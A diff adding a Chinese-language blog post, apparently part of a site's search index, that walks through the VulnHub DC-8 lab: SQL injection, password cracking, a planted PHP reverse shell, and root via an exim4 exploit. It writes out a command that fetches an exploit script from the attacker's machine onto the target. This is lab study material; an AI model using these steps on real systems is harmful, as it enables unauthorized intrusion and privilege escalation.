@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>vulnhub-DC8</title>
+      <link href="/2020/11/17/vulnhub-DC8/"/>
+      <url>/2020/11/17/vulnhub-DC8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老规矩，扫描一波IP地址，发现靶机的IP和开放端口，靶机开放了80和22端口，推测我们又要从80端口开始渗透<br><img src="/2020/11/17/vulnhub-DC8/1.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>进入靶机的80页面之后发现是一个博客页面，随便点点，发现URL会发生变化，<br><img src="/2020/11/17/vulnhub-DC8/2.png" alt><br>看着挺像做SQL注入时的靶场，所以，测试一下SQL注入，<br><img src="/2020/11/17/vulnhub-DC8/3.png" alt><br>我在这里猜测一下这个SQL漏洞的原理，对于URL中GET到的数据没有做出防护而且默认给我们会自动加上’进行闭合，而我们如果输入语句进行闭合那么之后的语句不会被执行。而且这里只有三个字段名，所以我们在nid后的数字只要不填123就可以注入<br><img src="/2020/11/17/vulnhub-DC8/4.png" alt><br><img src="/2020/11/17/vulnhub-DC8/5.png" alt><br><img src="/2020/11/17/vulnhub-DC8/6.png" alt><br><img src="/2020/11/17/vulnhub-DC8/7.png" alt><br>所以利用SQL注入拿数据库名，表名，字段名，用户名和密码</p><p>然后启用kali中的john开始对得到的密码进行暴力破解，最后可以得到john的密码（admin的密码就别想了），<br><img src="/2020/11/17/vulnhub-DC8/8.png" alt><br>得到john的密码为turtle，本来我想用ssh连接但最后失败了，所以就只能把注意力转到80页面，登录一波，（登录页面可以通过查看rebots.txt来查看），登录john的账号，<br>看看有没有什么值得注意的地方，最后发现，这个博客支持PHP语言，<br><img src="/2020/11/17/vulnhub-DC8/9.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>所以对页面进行写入反弹shell的PHP代码（原本试了一句话木发现不行），kali监听端口，然后利用pyhton实现交互式shell，<br><img src="/2020/11/17/vulnhub-DC8/10.png" alt><br>再查看当前用户的权限，最后发现，在/usr/bin/exim4当前用户具有较高的权限，<br><img src="/2020/11/17/vulnhub-DC8/11.png" alt><br>在kali中searchsploits一下发现了，不少漏洞，我看了别人的wp之后，发现46996是用的最频繁的（主要是它自身就是一个脚本），<br><img src="/2020/11/17/vulnhub-DC8/12.png" alt><br>把46996转换成unix支持的文件格式要不然执行的时候会报错（我被这一步卡了好久，心态炸裂），<br><img src="/2020/11/17/vulnhub-DC8/13.png" alt><br>然后在kali上开启web服务，将脚本下载到靶机上（最好是/tmp下，我在其他目录下发现www-data用户没有权限），</p><pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer     //kali开启http服务的命令wget http://1921.168.1.210/12138.sh   //从kali中下载脚本</code></pre><p><img src="/2020/11/17/vulnhub-DC8/14.png" alt><br><img src="/2020/11/17/vulnhub-DC8/15.png" alt><br><img src="/2020/11/17/vulnhub-DC8/16.png" alt><br>给脚本权限之后运行，就可以拿到root权限，最后拿到flag，</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>vulnhub-DC7</title>
       <link href="/2020/11/14/vulnhub-DC7/"/>
       <url>/2020/11/14/vulnhub-DC7/</url>
